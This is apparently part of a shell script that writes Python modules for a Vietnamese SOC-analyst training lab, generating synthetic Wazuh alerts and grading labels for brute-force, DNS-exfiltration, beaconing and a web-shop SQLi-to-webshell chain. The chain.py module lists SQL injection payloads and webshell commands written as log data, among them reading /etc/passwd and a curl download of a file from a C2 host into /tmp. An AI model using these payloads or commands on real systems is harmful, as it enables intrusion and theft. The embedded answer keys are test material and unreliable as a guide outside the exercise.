LABEL = {"T1": 1, "T5": 1, "T4": 1, "X1B1": 1, "B1": 2, "B4": 2, "F1": 3, "F2": 3, "M1": 3}


def _alert(key, ts, host, data, full_log, decoder, program=None, mitre=None):
    rid, lv, desc, groups = R[key]
    return docs.alert(ts, host, rid, lv, desc, groups, data=data, full_log=full_log, decoder=decoder,
                      program=program, mitre=mitre)


def _b32(rng, n):
    return "".join(rng.choice(string.ascii_lowercase + "234567") for _ in range(n))


# =============================================================== PLAN (luc seed)
def plan_T1(w, ctx, rng):
    host = w.pick_host(["TB", "Thap"], exclude=("web-shop",))
    victim = w.take_staff()
    return {"pattern": "T1", "host": host, "src": w.new_ext_ip(), "victim": victim,
            "users": [w.rng.choice(w.staff)["user"] for _ in range(rng.randint(15, 25))] + [victim["user"]],
            "n_fail": rng.randint(40, 80), "V": 1, "P": PRIO[("B", w.crit(host))], "E": victim["id"]}


def plan_X1B1(w, ctx, rng):
    host = w.pick_host(["TB"], exclude=("web-shop",))
    _ensure_scanner(w, ctx)
    victim = w.take_staff()
    kind = rng.choice(["a", "b", "c"])
    t0 = ctx.t0
    if kind == "a":       # CHG ket thuc >= 2h truoc canh bao
        ctx.change([host], "vuln_scan", t0 - 6 * 3600, t0 - 2.5 * 3600, ip=w.ip("scan-01"), actor="Security")
    elif kind == "b":     # CHG ghi IP may quet KHAC
        ctx.change([host], "vuln_scan", t0 - 3600, t0 + 4 * 3600, ip=w.ip("scan-02"), actor="Security")
    else:                 # CHG da huy
        ctx.change([host], "vuln_scan", t0 - 3600, t0 + 4 * 3600, ip=w.ip("scan-01"), status="cancelled", actor="Security")
    return {"pattern": "X1B1", "host": host, "src": w.ip("scan-01"), "victim": victim, "x1": kind,
            "users": [w.rng.choice(w.staff)["user"] for _ in range(rng.randint(15, 25))] + [victim["user"]],
            "n_fail": rng.randint(40, 80), "V": 1, "P": PRIO[("B", "TB")], "E": victim["id"]}


def plan_B1(w, ctx, rng):
    host = w.pick_host(["TB", "Thap"], exclude=("web-shop",))
    _ensure_scanner(w, ctx)
    n = ctx.change([host], "vuln_scan", ctx.t0 - 1800, ctx.t0 + 4 * 3600, ip=w.ip("scan-01"), actor="Security",
                   description="Quet lo hong dinh ky")
    return {"pattern": "B1", "host": host, "src": w.ip("scan-01"),
            "users": [w.rng.choice(w.staff)["user"] for _ in range(rng.randint(15, 25))],
            "n_fail": rng.randint(40, 80), "V": 2, "P": 4, "E": n}


def plan_T5(w, ctx, rng):
    host = w.pick_host(["TB", "Thap"], exclude=("web-shop",))
    st = w.take_staff()
    ctx.leave(st, ctx.t0 - 2 * 86400, ctx.t0 + 3 * 86400)
    return {"pattern": "T5", "host": host, "user": st, "src": w.new_ext_ip(), "home": _home_ip(w, rng),
            "V": 1, "P": PRIO[("B", w.crit(host))], "E": st["id"]}


def plan_B4(w, ctx, rng):
    host = w.pick_host(["TB", "Thap"], exclude=("web-shop",))
    st = w.take_staff()
    n = ctx.oncall(st, [host, "jump-01"], ctx.t0 - 3600, ctx.t0 + 8 * 3600)
    # moi: cung nguoi, dung gio nhung KHONG gom may nay
    other = rng.choice([h for h in w.hosts_by_crit("TB") if h != host])
    ctx.oncall(st, [other], ctx.t0 + 9 * 3600, ctx.t0 + 17 * 3600)
    return {"pattern": "B4", "host": host, "user": st, "src": "10.250.%d.%d" % (rng.randint(1, 9), rng.randint(11, 249)),
            "home": _home_ip(w, rng), "V": 2, "P": 4, "E": n}


def plan_T4(w, ctx, rng):
    host = w.pick_host(["Thap"], exclude=("web-staging", "print-01"))
    dom = "%s.%s" % ("".join(rng.choice("bcdfghklmnpqrstvz") for _ in range(7)), rng.choice(["net", "info", "top"]))
    return {"pattern": "T4", "host": host, "domain": dom, "n": rng.randint(120, 200),
            "V": 1, "P": PRIO[("A", "Thap")], "E": w.octet(w.ip(host))}


def plan_F1(w, ctx, rng):
    host = w.pick_host(["Thap"])
    vendor, dom = w.av
    hosts = [h for h in w.hosts if h.startswith("ws-")] + [host]
    n = ctx.service(sorted(set(hosts)), "Phan mem diet virus %s (tra cuu danh tieng file qua DNS)" % vendor, dom)
    return {"pattern": "F1", "host": host, "domain": dom, "others": [h for h in hosts if h != host][:3],
            "V": 3, "P": 4, "E": n}


def plan_F2(w, ctx, rng):
    host = w.pick_host(["TB"], exclude=("web-shop",))
    proc, path = w.mon
    n = ctx.service([h for h in w.hosts if not h.startswith("ws-")], "Agent giam sat %s" % proc, path)
    return {"pattern": "F2", "host": host, "path": path, "V": 3, "P": 4, "E": n}


def plan_M1(w, ctx, rng):
    host = w.pick_host(["TB", "Thap"], exclude=("web-shop",))
    vendor_ip = w.new_ext_ip()
    path = rng.choice(["/opt/netdata/bin/netdata", "/opt/veeam/bin/veeamtransport", "/usr/sbin/telemetryd"])
    n = ctx.service([host], "Agent gui so lieu van hanh ve nha cung cap (moi 30 giay)", "%s -> %s:443" % (path, vendor_ip))
    return {"pattern": "M1", "host": host, "dst": vendor_ip, "path": path, "V": 3, "P": 4, "E": n}


PLANNERS = {"T1": plan_T1, "X1B1": plan_X1B1, "B1": plan_B1, "T5": plan_T5, "B4": plan_B4,
            "T4": plan_T4, "F1": plan_F1, "F2": plan_F2, "M1": plan_M1}


def _ensure_scanner(w, ctx):
    for name in ("scan-01", "scan-02"):
        if name not in w.hosts:
            w.hosts[name] = {"name": name, "role": "may quet lo hong", "crit": "TB", "ip": w._new_ip(w.subnet_srv)}
            w.ip2host[w.hosts[name]["ip"]] = name
            ctx.asset(name)


def _home_ip(w, rng):
    return "%s.%d" % (w.subnet_ws, rng.randint(11, 249))


# =============================================================== chon co cau hang doi
def compose(rng, n=9, waves=(4, 3, 2)):
    """Chon n mau + chia dot. Rang buoc (kich ban 5.1 + chong suy luan cau truc cua Bai 14 muc 4.4)."""
    for _ in range(500):
        n_tp = rng.choice([3, 4])
        tps = [rng.choice(["T1", "T5", "T4"]) for _ in range(n_tp)]
        if rng.random() < 0.5:
            tps[rng.randrange(n_tp)] = "X1B1"
        rest = ["M1"] + [rng.choice(["B1", "B4", "F1", "F2"]) for _ in range(n - n_tp - 1)]
        pats = tps + rest
        labels = [LABEL[p] for p in pats]
        if labels.count(2) < 2 or labels.count(3) < 2:
            continue
        fam = {}
        for p in pats:
            fam.setdefault(FAMILY[p], []).append(LABEL[p])
        if not any(len(v) == 1 for v in fam.values()):                       # (a)
            continue
        if not any(max(v.count(x) for x in set(v)) >= 2 for v in fam.values()):   # (b)
            continue
        rng.shuffle(pats)
        out, i = [], 0
        for wv, size in enumerate(waves):
            grp = pats[i:i + size]
            i += size
            if all(LABEL[p] == 1 for p in grp):
                break
            out.append(grp)
        else:
            return out
    raise RuntimeError("khong dung duoc hang doi thoa rang buoc")


# =============================================================== RENDER (luc phat)
def render(plan, ts, w, rng):
    """-> (ticket_doc_khong_INC, [evidence_docs]). Moi bang chung co timestamp <= ts."""
    return RENDER[plan["pattern"]](plan, ts, w, rng)


def _ssh_lines(host, src, users, n, t_end, rng, success_user=None):
    out, t = [], t_end - rng.randint(300, 900)
    step = (t_end - t) / max(n, 1)
    for k in range(n):
        u = rng.choice(users)
        tt = t + k * step + rng.random()
        line = "%s %s sshd[%d]: Failed password for %s from %s port %d ssh2" % (
            docs.syslog_ts(tt), host, rng.randint(1000, 60000), u, src, rng.randint(30000, 60000))
        out.append(_alert("ssh_fail", tt, host, {"srcip": src, "dstuser": u}, line, "sshd", "sshd", ["T1110"]))
    if success_user:
        tt = t_end - rng.randint(5, 40)
        line = "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
            docs.syslog_ts(tt), host, rng.randint(1000, 60000), success_user, src, rng.randint(30000, 60000))
        out.append(_alert("ssh_ok", tt, host, {"srcip": src, "dstuser": success_user}, line, "sshd", "sshd", ["T1078"]))
    return out


def r_ssh(plan, ts, w, rng):
    victim = plan.get("victim")
    ev = _ssh_lines(plan["host"], plan["src"], plan["users"], plan["n_fail"], ts - 60, rng,
                    success_user=victim["user"] if victim else None)
    tk = _alert("ssh_brute", ts, plan["host"], {"srcip": plan["src"]},
                "%s %s sshd: brute force from %s" % (docs.syslog_ts(ts), plan["host"], plan["src"]), "sshd", "sshd", ["T1110"])
    return tk, ev


def r_login(plan, ts, w, rng):
    host, u = plan["host"], plan["user"]["user"]
    ev = []
    for d in range(1, 8):                     # baseline 7 ngay: chi tu 1 IP noi bo, gio hanh chinh
        tt = ts - d * 86400 + rng.randint(-3 * 3600, 3 * 3600)
        line = "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
            docs.syslog_ts(tt), host, rng.randint(1000, 60000), u, plan["home"], rng.randint(30000, 60000))
        ev.append(_alert("ssh_ok", tt, host, {"srcip": plan["home"], "dstuser": u}, line, "sshd", "sshd"))
    line = "%s %s sshd[%d]: Accepted password for %s from %s port %d ssh2" % (
        docs.syslog_ts(ts - 20), host, rng.randint(1000, 60000), u, plan["src"], rng.randint(30000, 60000))
    ev.append(_alert("ssh_ok", ts - 20, host, {"srcip": plan["src"], "dstuser": u}, line, "sshd", "sshd"))
    tk = _alert("new_src", ts, host, {"srcip": plan["src"], "dstuser": u}, line, "sshd", "sshd", ["T1078"])
    return tk, ev


def _dns(ts, client, q, src_ip):
    """Truy van DNS cua may 'client' (ghi o dns-01, IP nguon = src_ip)."""
    line = "%s %s dnsmasq[%d]: query[A] %s from %s" % (docs.syslog_ts(ts), "dns-01", 700, q, src_ip)
    return _alert("dns_q", ts, "dns-01", {"srcip": src_ip, "query": q}, line, "dnsmasq", "dnsmasq")


def r_T4(plan, ts, w, rng):
    host, ip = plan["host"], w.ip(plan["host"])
    t = ts - 1200
    ev = [_dns(t + k * 1200 / plan["n"], host, "%s.%s" % (_b32(rng, rng.randint(40, 60)), plan["domain"]), ip)
          for k in range(plan["n"])]
    tk = _alert("dns", ts, host, {"srcip": ip, "query": "*.%s" % plan["domain"]}, "dns exfil heuristic", "dnsmasq", mitre=["T1048"])
    return tk, ev


def r_F1(plan, ts, w, rng):
    vendor, dom = w.av
    ev = []
    for h in [plan["host"]] + plan["others"]:
        for k in range(rng.randint(15, 30)):
            ev.append(_dns(ts - rng.randint(60, 1800), h, "%s.%s" % ("".join(rng.choice("0123456789abcdef") for _ in range(48)), dom), w.ip(h)))
    tk = _alert("dns", ts, plan["host"], {"srcip": w.ip(plan["host"]), "query": "*.%s" % dom}, "dns exfil heuristic", "dnsmasq", mitre=["T1048"])
    return tk, ev


def r_F2(plan, ts, w, rng):
    host = plan["host"]
    ev = []
    for k in range(rng.randint(3, 6)):
        tt = ts - rng.randint(30, 900)
        ev.append(_alert("audit_exec", tt, host, {"audit": {"exe": plan["path"], "command": plan["path"].rsplit("/", 1)[1]}},
                         "type=EXECVE exe=%s" % plan["path"], "auditd"))
    tk = _alert("revshell", ts, host, {"audit": {"exe": plan["path"]}}, "type=EXECVE exe=%s" % plan["path"], "auditd", mitre=["T1059"])
    return tk, ev


def netmon(ts, host, dst, port, proc, src_ip):
    line = "%s %s netmon: conn dst=%s port=%d proc=%s" % (docs.syslog_ts(ts), host, dst, port, proc)
    return _alert("conn", ts, host, {"srcip": src_ip, "dstip": dst, "dstport": str(port), "process": {"name": proc}}, line, "netmon", "netmon")


def r_M1(plan, ts, w, rng):
    host = plan["host"]
    ev = [netmon(ts - 30 * k, host, plan["dst"], 443, plan["path"], w.ip(host)) for k in range(1, rng.randint(25, 40))]
    tk = _alert("beacon", ts, host, {"srcip": w.ip(host), "dstip": plan["dst"], "dstport": "443", "process": {"name": plan["path"]}},
                "periodic outbound", "netmon", mitre=["T1071"])
    return tk, ev


RENDER = {"T1": r_ssh, "X1B1": r_ssh, "B1": r_ssh, "T5": r_login, "B4": r_login,
          "T4": r_T4, "F1": r_F1, "F2": r_F2, "M1": r_M1}


def plan_queue(w, ctx, rng):
    """-> list cac dot, moi dot la list plan (da chot dap an)."""
    return [[dict(PLANNERS[p](w, ctx, random.Random(rng.random())), family=FAMILY[p]) for p in grp]
            for grp in compose(rng)]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/chain.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# chain.py - chien dich tren web-shop (kich ban Bai 18, muc 5.1 luong B):
#   C1 SQLi thanh cong      ticket (ghi thang)          TP P1  E = octet IP ke tan cong
#   C2 webshell .phtml (FIM) ticket (ghi thang)          TP P1  E = octet IP ke tan cong
#   C3 goi lenh qua webshell KHONG ticket; dong log THAT qua analysisd (luat R-A cua SV no truc tiep)
#   C4 implant beacon 30s    ticket (ghi thang)          TP P1  E = octet IP C2
#   C5 quet noi bo           KHONG ticket; dong log THAT, tron trong bao (luat R-B)
#   C6 exfil DNS             ticket (ghi thang)          TP P1  E = octet IP web-shop (may nguon bi nhiem)
# Ngoai ra: bao ket noi tu may sao luu (CHG), luu luong web hop le (anh + script da duyet).
# ============================================================================
import random
import string

from . import docs
from .cases import R as BASE_R, _alert, netmon, _dns

R = dict(BASE_R)
R.update({
    "web":     ("100150", 3, "Web access log", ["web", "accesslog"]),
    "sqli_ok": ("100151", 12, "SQL injection thanh cong: phan hoi 200 kich thuoc lon toi IP ngoai",
                ["web", "attack", "sql_injection", "soc_web"]),
    "sqli":    ("100153", 6, "SQL injection attempt", ["web", "attack", "sql_injection"]),
    "fim_up":  ("100152", 12, "File thuc thi moi trong thu muc uploads/ cua web", ["syscheck", "soc_web"]),
})
SQLI = ["' OR 1=1--", "1 UNION SELECT NULL,NULL--", "1' AND SLEEP(5)--", "1;DROP TABLE x--", "admin'--"]
CMDS = ["id", "uname -a", "cat /etc/passwd", "ls -la /var/www", "ps aux", "netstat -tnp", "whoami",
        "cat config.php", "find / -name '*.sql'", "curl -s http://%s/k -o /tmp/.k"]
MITRE_CHAIN = {"C1": "T1190", "C2": "T1505.003", "C3": "T1505.003", "C4": "T1071", "C5": "T1046", "C6": "T1048"}
SCAN_PORTS = [22, 445, 3306, 3389, 5432, 80, 8080, 139, 6379, 1433]


def plan(w, rng):
    """Dap an chuoi (P1 deu tren web-shop - muc Cao). INC gan sau (shift.py)."""
    ws = w.ip("web-shop")
    return {
        "C1": {"pattern": "C1", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.attacker_ip),
               "noise_ips": [w.new_ext_ip() for _ in range(rng.randint(3, 5))]},
        "C2": {"pattern": "C2", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.attacker_ip)},
        "C4": {"pattern": "C4", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(w.c2_ip)},
        "C6": {"pattern": "C6", "host": "web-shop", "V": 1, "P": 1, "E": w.octet(ws)},
        "SC": {"HOST": "web-shop", "GIAI_DOAN": 6, "ASSET_LEVEL": 1, "STAGE": "A", "IOC_C2": w.octet(w.c2_ip),
               "MITRE": sorted({m.split(".")[0][1:] for m in MITRE_CHAIN.values()}), "DE_XUAT": [1, 2, 3, 8]},
    }


# ---------------------------------------------------------------- ticket chuoi (ghi thang)
def render(key, p, ts, w, rng):
    return {"C1": r_C1, "C2": r_C2, "C4": r_C4, "C6": r_C6}[key](p, ts, w, rng)


def _web_doc(ts, host, src, method, url, status, size):
    line = docs.line_web(ts, host, src, method, url, status, size)
    return docs.alert(ts, host, *R["web"][:2], R["web"][2], R["web"][3],
                      data={"srcip": src, "url": url, "id": str(status), "protocol": method},
                      full_log=line, decoder="web-accesslog", program="nginx")


def r_C1(p, ts, w, rng):
    ev = []
    for ip in p["noise_ips"]:                       # ke do tham khac: payload bi chan (403/500)
        for k in range(rng.randint(5, 15)):
            tt = ts - rng.randint(120, 1500)
            u = "/product.php?id=%s" % rng.choice(SQLI).replace(" ", "%20")
            ev.append(docs.alert(tt, "web-shop", *R["sqli"][:2], R["sqli"][2], R["sqli"][3],
                                 data={"srcip": ip, "url": u, "id": rng.choice(["403", "500"])},
                                 full_log=docs.line_web(tt, "web-shop", ip, "GET", u, 403, 312), decoder="web-accesslog"))
    big = []
    for k in range(rng.randint(6, 10)):             # RIENG ke tan cong: 200 voi so byte gap 20-50 lan nen
        tt = ts - rng.randint(10, 300)
        u = "/product.php?id=%s" % rng.choice(SQLI[:2]).replace(" ", "%20")
        size = rng.randint(20, 50) * 2400
        big.append(docs.alert(tt, "web-shop", *R["sqli"][:2], R["sqli"][2], R["sqli"][3],
                              data={"srcip": w.attacker_ip, "url": u, "id": "200"},
                              full_log=docs.line_web(tt, "web-shop", w.attacker_ip, "GET", u, 200, size), decoder="web-accesslog"))
    tk = docs.alert(ts, "web-shop", *R["sqli_ok"][:2], R["sqli_ok"][2], R["sqli_ok"][3],
                    data={"srcip": w.attacker_ip, "url": "/product.php", "id": "200"},
                    full_log=big[-1]["full_log"], decoder="web-accesslog", mitre=["T1190"])
    return tk, ev + big


def r_C2(p, ts, w, rng):
    path = "/var/www/html" + w.upload_dir + w.webshell
    up = _web_doc(ts - rng.randint(3, 20), "web-shop", w.attacker_ip, "POST", "/profile/upload_avatar.php", 200, 128)
    tk = docs.fim(ts, "web-shop", *R["fim_up"][:2], R["fim_up"][2], path, "added", "www-data", mitre=["T1505.003"])
    tk["rule"]["groups"] = R["fim_up"][3] + ["syscheck_entry_added"]
    return tk, [up]


def r_C4(p, ts, w, rng):
    ws = w.ip("web-shop")
    ev = [docs.alert(ts - 600, "web-shop", *R["audit_exec"][:2], R["audit_exec"][2], R["audit_exec"][3],
                     data={"audit": {"exe": "/tmp/.k", "command": "[kworker/u4:2]", "uid": "33"}},
                     full_log="type=EXECVE exe=/tmp/.k uid=33", decoder="auditd")]
    ev += [netmon(ts - 30 * k, "web-shop", w.c2_ip, w.c2_port, "[kworker/u4:2]", ws) for k in range(1, 20)]
    tk = docs.alert(ts, "web-shop", *R["beacon"][:2], R["beacon"][2], R["beacon"][3],
                    data={"srcip": ws, "dstip": w.c2_ip, "dstport": str(w.c2_port), "process": {"name": "[kworker/u4:2]"}},
                    full_log="periodic outbound", decoder="netmon", mitre=["T1071"])
    return tk, ev


def r_C6(p, ts, w, rng):
    ws = w.ip("web-shop")
    ev = [_dns(ts - 900 + k * 4, "web-shop", "%s.%s" % ("".join(rng.choice(string.ascii_lowercase + "234567") for _ in range(rng.randint(45, 60))), w.exfil_domain), ws)
          for k in range(rng.randint(150, 220))]
    tk = docs.alert(ts, "web-shop", *R["dns"][:2], R["dns"][2], R["dns"][3],
                    data={"srcip": ws, "query": "*.%s" % w.exfil_domain}, full_log="dns exfil heuristic",
                    decoder="dnsmasq", mitre=["T1048"])
    return tk, ev


# ---------------------------------------------------------------- dong log THAT (qua analysisd)
def lines_webshell_cmd(ts, w, rng):
    """C3: 1-3 lenh qua webshell, ten tham so DOI LIEN TUC (khong 'cmd=')."""
    out = []
    for k in range(rng.randint(1, 3)):
        c = rng.choice(CMDS)
        if "%s" in c:
            c = c % w.c2_ip
        url = "%s%s?%s=%s" % (w.upload_dir, w.webshell, rng.choice(w.cmd_params), c.replace(" ", "+"))
        out.append(docs.line_web(ts + k, "web-shop", w.attacker_ip, "GET", url, 200, rng.randint(80, 4000)))
    return out


def lines_web_noise(ts, w, rng, n):
    """Khach hang: trang, anh trong uploads/, script DA DUYET trong uploads/ (co query) - KHONG duoc bat."""
    out = []
    for k in range(n):
        ip = "%d.%d.%d.%d" % (rng.choice([14, 27, 42, 113, 116, 171, 222]), rng.randint(1, 254), rng.randint(1, 254), rng.randint(1, 254))
        r = rng.random()
        if r < 0.45:
            url = rng.choice(["/", "/product.php?id=%d" % rng.randint(1, 900), "/cart.php", "/search.php?q=ao+khoac"])
        elif r < 0.8:
            url = "%savatar_%d.%s" % (w.upload_dir, rng.randint(1000, 99999), rng.choice(["png", "jpg", "webp"]))
        else:
            url = "%s%s?w=%d&h=%d&f=avatar_%d.png" % (w.upload_dir, w.approved_script, rng.choice([64, 128, 256]),
                                                      rng.choice([64, 128, 256]), rng.randint(1000, 99999))
        out.append(docs.line_web(ts + k * 0.3, "web-shop", ip, "GET", url, rng.choice([200, 200, 200, 304, 404]), rng.randint(200, 90000)))
    return out


def lines_storm(ts, w, rng, n):
    """Bao: may sao luu (CHG) -> nhieu may chu noi bo, cong agent."""
    targets = [h["ip"] for name, h in w.hosts.items() if not name.startswith(("ws-", "bk-")) and name != "siem"]
    out = []
    for k in range(n):
        src_host = rng.choice(w.backup_hosts)
        out.append(docs.line_conn(ts + k * 0.05, src_host, w.ip(src_host), rng.choice(targets), w.backup_port))
    return out


def lines_scan(ts, w, rng, n):
    """C5: web-shop quet noi bo (nhieu may, nhieu cong)."""
    targets = [h["ip"] for name, h in w.hosts.items() if name not in ("web-shop", "siem")]
    return [docs.line_conn(ts + k * 0.2, "web-shop", w.ip("web-shop"), rng.choice(targets), rng.choice(SCAN_PORTS))
            for k in range(n)]
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/ctx.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# ctx.py - ngu canh doanh nghiep (hop dong du lieu Bai 14, muc 4.3):
#   ctx-assets  (type asset | service)   AST-### / SVC-###
#   ctx-changes                          CHG-####
#   ctx-hr      (kind leave | oncall)    LV-#### / OC-####
# Registry cap so ID DUY NHAT va giu moi ban ghi; cases.py / chain.py them ban ghi rieng cua minh.
# ============================================================================
import time

from . import docs


def hhmm(ts):
    """ISO 8601 co mui gio dang +07:00 (OpenSearch 'date' doc duoc; nguoi doc thay dung gio dia phuong)."""
    z = time.strftime("%z", time.localtime(ts))
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(ts)) + z[:3] + ":" + z[3:]


class Ctx:
    def __init__(self, world, t0):
        self.w, self.t0, self.rng = world, t0, world.rng
        self.records = {"ctx-assets": [], "ctx-changes": [], "ctx-hr": []}
        self._used = {"AST": set(), "SVC": set(), "CHG": set(), "LV": set(), "OC": set()}

    def _id(self, kind, lo, hi):
        while True:
            n = self.rng.randint(lo, hi)
            if n not in self._used[kind] and all(n not in s for s in self._used.values()):
                # so DUY NHAT tren moi loai -> cot E cua BTP/FP khong trung nhau
                self._used[kind].add(n)
                return n

    # ------------------------------------------------------------ them ban ghi
    def asset(self, host):
        h = self.w.hosts[host]
        n = self._id("AST", 100, 999)
        self.records["ctx-assets"].append({"id": "AST-%03d" % n, "type": "asset", "host": host, "ip": h["ip"],
                                           "criticality": h["crit"], "name": h["role"], "status": "active",
                                           "actor": "IT", "description": ""})
        return n

    def service(self, hosts, name, match, status="approved", actor="IT Ops", description=""):
        # mot phan mem = MOT ban ghi SVC (2 ticket cung phan mem -> cung so E, khong mo ho)
        for r in self.records["ctx-assets"]:
            if r.get("type") == "service" and r["match"] == match and r["status"] == status:
                r["host"] = sorted(set(r["host"]) | set(hosts))
                return int(r["id"].split("-")[1])
        n = self._id("SVC", 100, 999)
        self.records["ctx-assets"].append({"id": "SVC-%03d" % n, "type": "service", "host": list(hosts),
                                           "name": name, "match": match, "status": status,
                                           "actor": actor, "description": description})
        return n

    def change(self, hosts, kind, start, end, status="approved", ip=None, actor="", description=""):
        n = self._id("CHG", 1000, 9999)
        rec = {"id": "CHG-%04d" % n, "host": list(hosts), "kind": kind, "start": hhmm(start), "end": hhmm(end),
               "status": status, "actor": actor, "description": description}
        if ip:
            rec["ip"] = ip if isinstance(ip, list) else [ip]
        self.records["ctx-changes"].append(rec)
        return n

    def oncall(self, staff, hosts, start, end, status="approved"):
        n = self._id("OC", 100, 9999)
        self.records["ctx-hr"].append({"id": "OC-%04d" % n, "kind": "oncall", "user": staff["user"], "name": staff["name"],
                                       "host": list(hosts), "start": hhmm(start), "end": hhmm(end), "status": status})
        return n

    def leave(self, staff, start, end, status="approved"):
        n = self._id("LV", 100, 9999)
        self.records["ctx-hr"].append({"id": "LV-%04d" % n, "kind": "leave", "user": staff["user"], "name": staff["name"],
                                       "start": hhmm(start), "end": hhmm(end), "status": status})
        return n

    # ------------------------------------------------------------ nen + moi chung
    def base(self):
        """Tai san moi may + dich vu nen + CHG dot trien khai agent sao luu (nguyen nhan bao)."""
        w, t0, r = self.w, self.t0, self.rng
        for host in w.hosts:
            self.asset(host)
        allsrv = [n for n in w.hosts if not n.startswith("ws-")]
        self.svc_upload = self.service(["web-shop"], "Script xu ly anh dai dien (da duyet)",
                                       w.upload_dir + w.approved_script, actor="Web team",
                                       description="Script hop le DUY NHAT trong thu muc upload; nhan tham so w,h")
        self.service(list(w.hosts), "Log rotate", "/var/log", description="logrotate 00:00 hang ngay")
        # CHG dot trien khai agent sao luu - CO nhac cong agent va may nguon
        bk_ips = [w.ip(h) for h in w.backup_hosts]
        self.chg_backup = self.change(
            w.backup_hosts, "deploy", t0 - 3600, t0 + 4 * 3600, ip=bk_ips, actor="DevOps",
            description="Trien khai agent sao luu moi tu %s toi toan bo may chu; agent ket noi cong TCP %d"
                        % (", ".join(w.backup_hosts), w.backup_port))
        # moi: CHG cua may khac / da xong / da huy; SVC retired
        self.change(["web-staging"], "deploy", t0 - 86400, t0 - 80000, status="completed", actor="Web team",
                    description="Cap nhat giao dien thu nghiem")
        self.change(["mail-01"], "patch", t0 - 3 * 86400, t0 - 3 * 86400 + 7200, status="completed", actor="IT Ops",
                    description="Va loi may chu thu")
        self.change(w.backup_hosts[:1], "deploy", t0 - 7 * 86400, t0 - 7 * 86400 + 3600, status="cancelled",
                    actor="DevOps", description="Trien khai agent sao luu (lan 1, da huy)")
        self.service(["web-shop"], "Script tai anh cu", w.upload_dir + "upload_old.php", status="retired",
                     actor="Web team", description="Ngung su dung tu Q2")
        self.service(allsrv, "Agent giam sat cu", "/opt/oldmon/bin/agent", status="retired")

    # ------------------------------------------------------------ xuat
    def as_docs(self):
        """{index: [doc...]} - moi doc kem @timestamp = t0 (index pattern ctx-* KHONG dung truong thoi gian)."""
        out = {}
        for idx, recs in self.records.items():
            out[idx] = [dict(r, **{"@timestamp": docs.iso(self.t0)}) for r in recs]
        return out
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/siem/bai18/lib/socq"
cat > "$LAB/siem/bai18/lib/socq/docs.py" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# docs.py - dung document "giong canh bao Wazuh" de ghi THANG vao indexer.
#
# Quy uoc toan lab (khop voi su kien di qua analysisd bang <localfile> - spike S-A):
#   - moi may gui log ve siem qua syslog tap trung -> agent luon la 000/siem
#   - MAY cua su kien = predecoder.hostname   (SOP ghi ro cho SV)
#   - truong ten nguoi dung cua sshd nam o data.dstuser (nhu Wazuh 4.14 that, Lab 17)
# ============================================================================
import datetime
import itertools
import time

_seq = itertools.count(1)


def iso(ts):
    """epoch -> dinh dang timestamp cua Wazuh ('2026-11-24T11:03:17.123+0000', UTC)."""
    d = datetime.datetime.fromtimestamp(ts, datetime.timezone.utc)
    return d.strftime("%Y-%m-%dT%H:%M:%S.") + "%03d+0000" % (d.microsecond // 1000)


def syslog_ts(ts):
    """epoch -> 'Nov 24 18:03:17' theo gio dia phuong cua container (nhu header syslog that)."""
    return time.strftime("%b %e %H:%M:%S", time.localtime(ts))


def index_name(ts):
    return "wazuh-alerts-4.x-" + time.strftime("%Y.%m.%d", time.gmtime(ts))


def alert(ts, host, rule_id, level, description, groups, data=None, full_log="", decoder=None,
          program=None, location=None, mitre=None, extra=None):
    """Mot document canh bao. 'data' la dict truong da giai ma (data.srcip, data.url, ...)."""
    rule = {"id": str(rule_id), "level": int(level), "description": description,
            "groups": list(groups), "firedtimes": 1, "mail": False}
    if mitre:
        rule["mitre"] = {"id": list(mitre)}
    doc = {
        "@timestamp": iso(ts),
        "timestamp": iso(ts),
        "agent": {"id": "000", "name": "siem"},
        "manager": {"name": "siem"},
        "id": "%d.%d" % (int(ts), next(_seq)),
        "rule": rule,
        "predecoder": {"hostname": host, "timestamp": syslog_ts(ts)},
        "full_log": full_log,
        "location": location or ("/var/log/soc-shift/%s.log" % host),
    }
    if program:
        doc["predecoder"]["program_name"] = program
    if decoder:
        doc["decoder"] = {"name": decoder}
    if data:
        doc["data"] = data
    if extra:
        for k, v in extra.items():
            doc[k] = v
    return doc


def fim(ts, host, rule_id, level, description, path, event="added", uname="root", groups=("ossec", "syscheck"),
        mitre=None, extra_sys=None):
    """Su kien giam sat toan ven file (FIM) - chi ghi thang vao indexer (logtest khong phat lai duoc FIM)."""
    sysc = {"path": path, "event": event, "uname_after": uname, "mode": "realtime"}
    if extra_sys:
        sysc.update(extra_sys)
    d = alert(ts, host, rule_id, level, description, list(groups) + ["syscheck_entry_%s" % event, "syscheck_file"],
              full_log="File '%s' %s" % (path, event), location="syscheck", mitre=mitre)
    d["syscheck"] = sysc
    return d


def ticket(doc, inc):
    """Bien mot canh bao thanh ticket hang doi: rule.groups + soc_queue, data.ticket = INC-xxx."""
    doc = dict(doc)
    doc["rule"] = dict(doc["rule"])
    doc["rule"]["groups"] = list(doc["rule"]["groups"]) + ["soc_queue"]
    data = dict(doc.get("data") or {})
    data["ticket"] = inc
    doc["data"] = data
    return doc


# ---------------------------------------------------------------- dong log THO (di qua analysisd)
def line_web(ts, host, srcip, method, url, status, size, agent="Mozilla/5.0"):
    """nginx access log qua syslog -> decoder web-accesslog, luat nen 31100 (spike S-A)."""
    d = time.strftime("%d/%b/%Y:%H:%M:%S %z", time.localtime(ts))
    return '%s %s nginx: %s - - [%s] "%s %s HTTP/1.1" %d %d "-" "%s"' % (
        syslog_ts(ts), host, srcip, d, method, url, status, size, agent)


def line_conn(ts, host, src, dst, dport, sport=None, proto="TCP"):
